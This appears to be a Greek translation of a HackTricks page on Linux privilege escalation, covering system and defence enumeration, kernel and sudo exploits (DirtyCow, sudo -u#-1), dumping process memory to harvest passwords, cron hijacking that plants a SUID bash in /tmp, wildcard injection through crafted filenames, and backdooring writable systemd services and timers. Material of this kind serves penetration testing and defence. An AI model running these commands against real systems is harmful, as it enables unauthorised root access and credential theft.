# Ανύψωση Δικαιωμάτων στο Linux

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks στο AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**Την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Πληροφορίες Συστήματος

### Πληροφορίες Λειτουργικού Συστήματος

Ας ξεκινήσουμε αποκτώντας κάποιες γνώσεις για το λειτουργικό σύστημα που τρέχει.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Διαδρομή

Αν **έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στη μεταβλητή `PATH`** ενδέχεται να μπορείτε να αποκτήσετε πρόσβαση σε ορισμένες βιβλιοθήκες ή δυαδικά αρχεία:
```bash
echo $PATH
```
### Πληροφορίες περιβάλλοντος

Ενδιαφέρουσες πληροφορίες, κωδικοί πρόσβασης ή κλειδιά API στις μεταβλητές περιβάλλοντος;
```bash
(env || set) 2>/dev/null
```
### Εκμετάλλευση πυρήνα

Ελέγξτε την έκδοση του πυρήνα και αν υπάρχει κάποια εκμετάλλευση που μπορεί να χρησιμοποιηθεί για την ανάδειξη προνομίων
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Μπορείτε να βρείτε μια καλή λίστα ευάλωτων πυρήνων και μερικά **εκ των προτέρων μεταγλωττισμένα exploits** εδώ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) και [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Άλλες ιστοσελίδες όπου μπορείτε να βρείτε μερικά **μεταγλωττισμένα exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Για να εξάγετε όλες τις ευάλωτες εκδόσεις πυρήνα από αυτό τον ιστότοπο, μπορείτε να κάνετε:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Εργαλεία που μπορούν να βοηθήσουν στην αναζήτηση εκμετάλλευσης πυρήνα είναι:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (εκτέλεση ΣΤΟ θύμα, ελέγχει μόνο εκμεταλλεύσεις για πυρήνα 2.x)

Πάντα **ψάξτε την έκδοση του πυρήνα στο Google**, ίσως η έκδοση του πυρήνα σας να είναι γραμμένη σε κάποια εκμετάλλευση πυρήνα και τότε θα είστε σίγουροι ότι αυτή η εκμετάλλευση είναι έγκυρη.

### CVE-2016-5195 (DirtyCow)

Ανόρθωση προνομίων Linux - Πυρήνας Linux <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Έκδοση Sudo

Βασισμένο στις ευάλωτες εκδόσεις του sudo που εμφανίζονται στο:
```bash
searchsploit sudo
```
Μπορείτε να ελέγξετε αν η έκδοση του sudo είναι ευάλωτη χρησιμοποιώντας αυτό το grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Από τον χρήστη @sickrov
```
sudo -u#-1 /bin/bash
```
### Αποτυχία επαλήθευσης υπογραφής Dmesg

Ελέγξτε το **smasher2 box του HTB** για ένα **παράδειγμα** πώς μπορεί να εκμεταλλευτεί αυτή η ευπάθεια
```bash
dmesg 2>/dev/null | grep "signature"
```
### Περισσότερη απαρίθμηση συστήματος
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Απαρίθμηση πιθανών αμυντικών μέτρων

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Το Execshield είναι ένα χαρακτηριστικό που εισήχθη στον πυρήνα Linux για να προστατεύει τη μνήμη από επιθέσεις buffer overflow.
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Διαφυγή από το Docker

Αν βρίσκεστε μέσα σε ένα container του Docker μπορείτε να προσπαθήσετε να δραπετεύσετε από αυτό:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Δίσκοι

Ελέγξτε **τι είναι προσαρτημένο και αποσυνδεδεμένο**, πού και γιατί. Αν κάτι είναι αποσυνδεδεμένο, μπορείτε να προσπαθήσετε να το προσαρτήσετε και να ελέγξετε για προσωπικές πληροφορίες.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Χρήσιμο λογισμικό

Καταγράψτε χρήσιμα δυαδικά αρχεία
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Επίσης, ελέγξτε εάν **έχει εγκατασταθεί κάποιος μεταγλωττιστής**. Αυτό είναι χρήσιμο εάν χρειαστεί να χρησιμοποιήσετε κάποια εκμετάλλευση πυρήνα καθώς συνιστάται να τη μεταγλωττίσετε στο μηχάνημα όπου πρόκειται να τη χρησιμοποιήσετε (ή σε ένα παρόμοιο).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Εγκατεστημένο Ευάλωτο Λογισμικό

Ελέγξτε τη **έκδοση των εγκατεστημένων πακέτων και υπηρεσιών**. Ίσως υπάρχει κάποια παλιά έκδοση του Nagios (για παράδειγμα) που θα μπορούσε να εκμεταλλευτεί για την ανάδειξη προνομίων...\
Συνιστάται να ελέγξετε χειροκίνητα την έκδοση του πιο ύποπτου εγκατεστημένου λογισμικού.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Εάν έχετε πρόσβαση SSH στη μηχανή, μπορείτε επίσης να χρησιμοποιήσετε το **openVAS** για να ελέγξετε αν υπάρχουν παλιά και ευάλωτα λογισμικά εγκατεστημένα μέσα στη μηχανή.

{% hint style="info" %}
_Σημειώστε ότι αυτές οι εντολές θα εμφανίσουν πολλές πληροφορίες που θα είναι κυρίως άχρηστες, επομένως συνιστάται η χρήση κάποιων εφαρμογών όπως το OpenVAS ή κάτι παρόμοιο που θα ελέγξει εάν κάποια έκδοση εγκατεστημένου λογισμικού είναι ευάλωτη σε γνωστές εκμεταλλεύσεις_
{% endhint %}

## Διεργασίες

Ρίξτε μια ματιά σε **ποιες διεργασίες** εκτελούνται και ελέγξτε εάν κάποια διεργασία έχει **περισσότερα προνόμια από ό,τι θα έπρεπε** (ίσως ένα tomcat να εκτελείται από τον χρήστη root;)
```bash
ps aux
ps -ef
top -n 1
```
Πάντα ελέγχετε για πιθανούς [**αποσφαλματωτές electron/cef/chromium** που εκτελούνται, μπορείτε να τους εκμεταλλευτείτε για εξέλιξη προνομίων](electron-cef-chromium-debugger-abuse.md). Το **Linpeas** τους ανιχνεύει ελέγχοντας την παράμετρο `--inspect` μέσα στη γραμμή εντολών της διαδικασίας.\
Επίσης **ελέγξτε τα προνόμιά σας πάνω στα δυαδικά των διεργασιών**, ίσως μπορείτε να αντικαταστήσετε κάποιον άλλον.

### Παρακολούθηση διεργασιών

Μπορείτε να χρησιμοποιήσετε εργαλεία όπως το [**pspy**](https://github.com/DominicBreuker/pspy) για την παρακολούθηση διεργασιών. Αυτό μπορεί να είναι πολύ χρήσιμο για την αναγνώριση ευάλωτων διεργασιών που εκτελούνται συχνά ή όταν πληρούνται ένα σύνολο απαιτήσεων.

### Μνήμη διεργασιών

Κάποιες υπηρεσίες ενός διακομιστή αποθηκεύουν **διαπιστευτήρια σε καθαρό κείμενο μέσα στη μνήμη**.\
Συνήθως θα χρειαστείτε **δικαιώματα ρίζας** για να διαβάσετε τη μνήμη διεργασιών που ανήκουν σε άλλους χρήστες, επομένως αυτό είναι συνήθως πιο χρήσιμο όταν είστε ήδη ρίζα και θέλετε να ανακαλύψετε περισσότερα διαπιστευτήρια.\
Ωστόσο, θυμηθείτε ότι **ως κανονικός χρήστης μπορείτε να διαβάσετε τη μνήμη των διεργασιών που σας ανήκουν**.

{% hint style="warning" %}
Σημειώστε ότι σήμερα τα περισσότερα μηχανήματα **δεν επιτρέπουν το ptrace από προεπιλογή** που σημαίνει ότι δεν μπορείτε να αντλήσετε άλλες διεργασίες που ανήκουν στον μη εξουσιοδοτημένο χρήστη σας.

Το αρχείο _**/proc/sys/kernel/yama/ptrace\_scope**_ ελέγχει την προσβασιμότητα του ptrace:

* **kernel.yama.ptrace\_scope = 0**: όλες οι διεργασίες μπορούν να ελεγχθούν, όσο έχουν τον ίδιο uid. Αυτή είναι η κλασική λειτουργία του ptracing.
* **kernel.yama.ptrace\_scope = 1**: μόνο μια γονική διεργασία μπορεί να ελεγχθεί.
* **kernel.yama.ptrace\_scope = 2**: Μόνο ο διαχειριστής μπορεί να χρησιμοποιήσει το ptrace, καθώς απαιτείται η δυνατότητα CAP\_SYS\_PTRACE.
* **kernel.yama.ptrace\_scope = 3**: Δεν μπορεί να ελεγχθεί καμία διεργασία με το ptrace. Μετά την ρύθμιση αυτής της τιμής, απαιτείται επανεκκίνηση για να ενεργοποιηθεί ξανά το ptracing.
{% endhint %}

#### GDB

Αν έχετε πρόσβαση στη μνήμη μιας υπηρεσίας FTP (για παράδειγμα), μπορείτε να ανακτήσετε το Heap και να αναζητήσετε μέσα σε αυτό τα διαπιστευτήριά της.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Σενάριο GDB

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Για ένα συγκεκριμένο αναγνωριστικό διεργασίας, το **maps δείχνει πώς η μνήμη είναι αντιστοιχισμένη μέσα στο χώρο διεύθυνσης** της συγκεκριμένης διεργασίας. Δείχνει επίσης τις **άδειες πρόσβασης κάθε αντιστοιχισμένης περιοχής**. Το ψευδές αρχείο **mem αποκαλύπτει την ίδια τη μνήμη των διεργασιών**. Από το αρχείο **maps γνωρίζουμε ποιες περιοχές μνήμης είναι αναγνώσιμες** και τις μετατοπίσεις τους. Χρησιμοποιούμε αυτές τις πληροφορίες για να **ψάξουμε στο αρχείο mem και να αντλήσουμε όλες τις αναγνώσιμες περιοχές** σε ένα αρχείο.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` παρέχει πρόσβαση στη **φυσική** μνήμη του συστήματος, όχι στην εικονική μνήμη. Ο εικονικός χώρος διευθύνσεων του πυρήνα μπορεί να προσπελαστεί χρησιμοποιώντας το /dev/kmem.\
Συνήθως, το `/dev/mem` είναι μόνο αναγνώσιμο από τον **root** και την ομάδα **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump για Linux

Το ProcDump είναι μια επανεκδοχή για Linux του κλασικού εργαλείου ProcDump από το σύνολο εργαλείων Sysinternals για τα Windows. Βρείτε το στο [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Εργαλεία

Για την απορρόφηση μνήμης ενός διεργασίας μπορείτε να χρησιμοποιήσετε:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Μπορείτε να αφαιρέσετε χειροκίνητα τις απαιτήσεις ρίζας και να απορροφήσετε τη διεργασία που σας ανήκει
* Σενάριο A.5 από [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (απαιτείται ρίζα)

### Διαπιστεύσεις από τη Μνήμη της Διεργασίας

#### Χειροκίνητο παράδειγμα

Αν ανακαλύψετε ότι η διεργασία ελέγχου ταυτότητας εκτελείται:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Μπορείτε να αδειάσετε τη διαδικασία (δείτε τμήματα πριν για να βρείτε διαφορετικούς τρόπους για να αδειάσετε τη μνήμη μιας διαδικασίας) και να αναζητήσετε διαπιστευτήρια μέσα στη μνήμη:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Το εργαλείο [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) θα **κλέψει κείμενο καθαρών διαπιστεύσεων από τη μνήμη** και από μερικά **γνωστά αρχεία**. Απαιτεί δικαιώματα ρίζας για να λειτουργήσει σωστά.

| Χαρακτηριστικό                                      | Όνομα Διεργασίας     |
| ------------------------------------------------- | -------------------- |
| Κωδικός GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Ενεργές Συνδέσεις FTP)                   | vsftpd               |
| Apache2 (Ενεργές Συνεδρίες HTTP Basic Auth)      | apache2              |
| OpenSSH (Ενεργές Συνεδρίες SSH - Χρήση Sudo)    | sshd:                |

#### Αναζήτηση Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Προγραμματισμένες/Cron εργασίες

Ελέγξτε εάν κάποια προγραμματισμένη εργασία είναι ευάλωτη. Ίσως μπορείτε να εκμεταλλευτείτε ένα σενάριο που εκτελείται από το ριζικό χρήστη (ευπάθεια με χρήση μπαλαντέρ; μπορείτε να τροποποιήσετε αρχεία που χρησιμοποιεί ο ριζικός χρήστης; χρησιμοποιήστε συμβολικούς συνδέσμους; δημιουργήστε συγκεκριμένα αρχεία στον κατάλογο που χρησιμοποιεί ο ριζικός χρήστη;).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Διαδρομή Cron

Για παράδειγμα, μέσα στο _/etc/crontab_ μπορείτε να βρείτε τη ΔΙΑΔΡΟΜΗ: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Σημειώστε πως ο χρήστης "user" έχει δικαιώματα εγγραφής στο /home/user_)

Αν μέσα σε αυτό το crontab ο χρήστης root προσπαθήσει να εκτελέσει κάποια εντολή ή script χωρίς να ορίσει τη διαδρομή. Για παράδειγμα: _\* \* \* \* root overwrite.sh_\
Τότε, μπορείτε να αποκτήσετε ένα root shell χρησιμοποιώντας:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Χρονοδιακόπτης που χρησιμοποιεί ένα σενάριο με μεταβλητή (Εισχώρηση με Wildcard)

Εάν ένα σενάριο εκτελείται από τον ριζικό χρήστη και περιέχει ένα "**\***" μέσα σε μια εντολή, μπορείτε να εκμεταλλευτείτε αυτό για να προκαλέσετε απροσδόκητα πράγματα (όπως ανύψωση προνομίων). Παράδειγμα:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Αν το μπαλαντέρ προηγείται ενός διαδρόμου όπως** _**/some/path/\***_ **, δεν είναι ευάλωτο (ακόμη και το** _**./\***_ **δεν είναι).**

Διαβάστε την παρακάτω σελίδα για περισσότερα κόλπα εκμετάλλευσης μπαλαντέρ:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Αντικατάσταση σεναρίου Cron και σύμβολο συμπύκνωσης

Αν **μπορείτε να τροποποιήσετε ένα σενάριο Cron** που εκτελείται από το ριζικό χρήστη, μπορείτε να αποκτήσετε πολύ εύκολα ένα κέλυφος:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Εάν το σενάριο που εκτελείται από το root χρησιμοποιεί ένα **κατάλογο στον οποίο έχετε πλήρη πρόσβαση**, ίσως είναι χρήσιμο να διαγράψετε αυτόν τον φάκελο και **να δημιουργήσετε ένα σύνδεσμο στον κατάλογο ενός άλλου** που εξυπηρετεί ένα σενάριο που ελέγχετε εσείς
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Συχνές εργασίες cron

Μπορείτε να παρακολουθείτε τις διεργασίες για να αναζητήσετε διεργασίες που εκτελούνται κάθε 1, 2 ή 5 λεπτά. Ίσως μπορείτε να εκμεταλλευτείτε αυτό και να αναβαθμίσετε τα προνόμια.

Για παράδειγμα, για **παρακολούθηση κάθε 0,1 δευτερολέπτου για 1 λεπτό**, **ταξινόμηση με λιγότερες εκτελούμενες εντολές** και διαγραφή των εντολών που έχουν εκτελεστεί τις περισσότερες φορές, μπορείτε να κάνετε:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Μπορείτε επίσης να χρησιμοποιήσετε** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (αυτό θα παρακολουθεί και θα καταχωρίζει κάθε διεργασία που ξεκινά).

### Αόρατες εργασίες cron

Είναι δυνατόν να δημιουργήσετε μια εργασία cron **βάζοντας ένα χαρακτήρα αλλαγής γραμμής μετά από ένα σχόλιο** (χωρίς χαρακτήρα νέας γραμμής), και η εργασία cron θα λειτουργεί. Παράδειγμα (σημειώστε τον χαρακτήρα αλλαγής γραμμής):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Υπηρεσίες

### Εγγράψιμα αρχεία _.service_

Ελέγξτε αν μπορείτε να γράψετε οποιοδήποτε αρχείο `.service`, αν μπορείτε, **μπορείτε να το τροποποιήσετε** ώστε να **εκτελεί** το **backdoor** σας όταν η υπηρεσία **ξεκινάει**, **επανεκκινείται** ή **σταματάει** (ίσως χρειαστεί να περιμένετε μέχρι να γίνει επανεκκίνηση η μηχανή).\
Για παράδειγμα, δημιουργήστε το backdoor σας μέσα στο αρχείο .service με **`ExecStart=/tmp/script.sh`**

### Εγγράψιμα δυαδικά αρχεία υπηρεσιών

Να έχετε υπόψη ότι αν έχετε **δικαιώματα εγγραφής σε δυαδικά αρχεία που εκτελούνται από υπηρεσίες**, μπορείτε να τα αλλάξετε για backdoors, έτσι ώστε όταν οι υπηρεσίες επανεκτελούνται, τα backdoors θα εκτελούνται.

### systemd PATH - Σχετικά Μονοπάτια

Μπορείτε να δείτε το PATH που χρησιμοποιείται από το **systemd** με:
```bash
systemctl show-environment
```
Αν ανακαλύψετε ότι μπορείτε να **εγγράψετε** σε οποιονδήποτε φάκελο της διαδρομής, μπορείτε να **αναβαθμίσετε τα δικαιώματά** σας. Πρέπει να αναζητήσετε **σχετικές διαδρομές που χρησιμοποιούνται σε αρχεία ρυθμίσεων υπηρεσιών** όπως:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Στη συνέχεια, δημιουργήστε ένα **εκτελέσιμο αρχείο** με το **ίδιο όνομα με το δυαδικό αρχείο στη σχετική διαδρομή** μέσα στον φάκελο PATH του systemd που μπορείτε να γράψετε, και όταν ζητηθεί από την υπηρεσία να εκτελέσει την ευάλωτη ενέργεια (**Έναρξη**, **Διακοπή**, **Επαναφόρτωση**), το **backdoor σας θα εκτελεστεί** (συνήθως οι μη προνομιούχοι χρήστες δεν μπορούν να ξεκινήσουν/σταματήσουν υπηρεσίες, αλλά ελέγξτε αν μπορείτε να χρησιμοποιήσετε `sudo -l`).

**Μάθετε περισσότερα για τις υπηρεσίες με την εντολή `man systemd.service`.**

## **Χρονοδιακόπτες (Timers)**

Οι **χρονοδιακόπτες (Timers)** είναι αρχεία μονάδας του systemd των οποίων το όνομα τελειώνει σε `**.timer**` και ελέγχουν αρχεία ή συμβάντα `**.service**`. Οι **χρονοδιακόπτες (Timers)** μπορούν να χρησιμοποιηθούν ως εναλλακτική λύση στο cron καθώς έχουν ενσωματωμένη υποστήριξη για χρονικά συμβάντα ημερολογίου και χρονικά συμβάντα μονοτονίας και μπορούν να εκτελούνται ασύγχρονα.

Μπορείτε να απαριθμήσετε όλους τους χρονοδιακόπτες με:
```bash
systemctl list-timers --all
```
### Εγγράψιμοι χρονοδιακόπτες

Εάν μπορείτε να τροποποιήσετε ένα χρονοδιακόπτη, μπορείτε να τον κάνετε να εκτελέσει ορισμένες υπάρχουσες μονάδες του systemd (όπως ένα `.service` ή ένα `.target`).
```bash
Unit=backdoor.service
```
Στην τεκμηρίωση μπορείτε να διαβάσετε τι είναι η Μονάδα:

> Η μονάδα που θα ενεργοποιηθεί όταν αυτός ο χρονοδιακόπτης λήξει. Το όρισμα είναι το όνομα μιας μονάδας, η οποία δεν έχει κατάληξη ".timer". Αν δεν καθοριστεί, αυτή η τιμή προεπιλέγεται σε μια υπηρεσία που έχει το ίδιο όνομα με τη μονάδα του χρονοδιακόπτη, εκτός από την κατάληξη. (Δείτε παραπάνω.) Συνιστάται το όνομα της μονάδας που ενεργοποιείται και το όνομα της μονάδας του χρονοδιακόπτη να είναι πανομοιότυπα, εκτός από την κατάληξη.

Συνεπώς, για να εκμεταλλευτείτε αυτήν την άδεια, θα χρειαζόσασταν:

* Να βρείτε μια μονάδα systemd (όπως ένα `.service`) που **εκτελεί ένα εγγράψιμο δυαδικό αρχείο**
* Να βρείτε μια μονάδα systemd που **εκτελεί ένα σχετικό μονοπάτι** και να έχετε **εγγράψιμα δικαιώματα** πάνω στο **σύστημα PATH του systemd** (για να προσωποποιήσετε αυτό το εκτελέσιμο)

**Μάθετε περισσότερα για τους χρονοδιακόπτες με την εντολή `man systemd.timer`.**

### **Ενεργοποίηση Χρονοδιακόπτη**

Για να ενεργοποιήσετε ένα χρονοδιακόπτη, χρειάζεστε δικαιώματα ριζού και να εκτελέσετε:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Σημειώστε ότι ο **χρονοδιακόπτης** ενεργοποιείται δημιουργώντας ένα σύμβολο σε αυτό στο `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Τα Unix Domain Sockets (UDS) επιτρέπουν τη **επικοινωνία διεργασιών** στον ίδιο ή διαφορετικό υπολογιστή μέσα σε μοντέλα πελάτη-εξυπηρετητή. Χρησιμοποιούν τυπικά αρχεία περιγραφέα Unix για τη διασύνδεση μεταξύ υπολογιστών και δημιουργούνται μέσω αρχείων `.socket`.

Οι Sockets μπορούν να διαμορφωθούν χρησιμοποιώντας αρχεία `.socket`.

**Μάθετε περισσότερα για τα sockets με την εντολή `man systemd.socket`.** Μέσα σε αυτό το αρχείο, μπορούν να διαμορφωθούν διάφορες ενδιαφέρουσες παράμετροι:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Αυτές οι επιλογές είναι διαφορετικές, αλλά μια περίληψη χρησιμοποιείται για να **υποδείξει πού θα ακούει** το socket (τη διαδρομή του αρχείου AF\_UNIX socket, τον αριθμό θύρας IPv4/6 για ακρόαση, κλπ.)
* `Accept`: Παίρνει ένα όρισμα boolean. Αν είναι **true**, ένα **παράδειγμα υπηρεσίας δημιουργείται για κάθε εισερχόμενη σύνδεση** και μόνο το socket σύνδεσης περνιέται σε αυτό. Αν είναι **false**, όλα τα ακούσματα των sockets περνιούνται **στην ενεργοποιημένη μονάδα υπηρεσίας**, και δημιουργείται μόνο μια μονάδα υπηρεσίας για όλες τις συνδέσεις. Αυτή η τιμή αγνοείται για sockets δεδομένων και FIFOs όπου μια μονάδα υπηρεσίας χειρίζεται απόλυτα όλη την εισερχόμενη κίνηση. **Προεπιλογή σε false**. Λόγω λόγων απόδοσης, συνιστάται να γράφετε νέους δαίμονες μόνο με τρόπο που είναι κατάλληλος για `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Παίρνει μία ή περισσότερες γραμμές εντολών, οι οποίες εκτελούνται **πριν** ή **μετά** από τα ακούσματα των **sockets**/FIFOs να **δημιουργηθούν** και να συνδεθούν, αντίστοιχα. Το πρώτο τεκμήριο της γραμμής εντολών πρέπει να είναι ένα απόλυτο όνομα αρχείου, ακολουθούμενο από ορίσματα για τη διαδικασία.
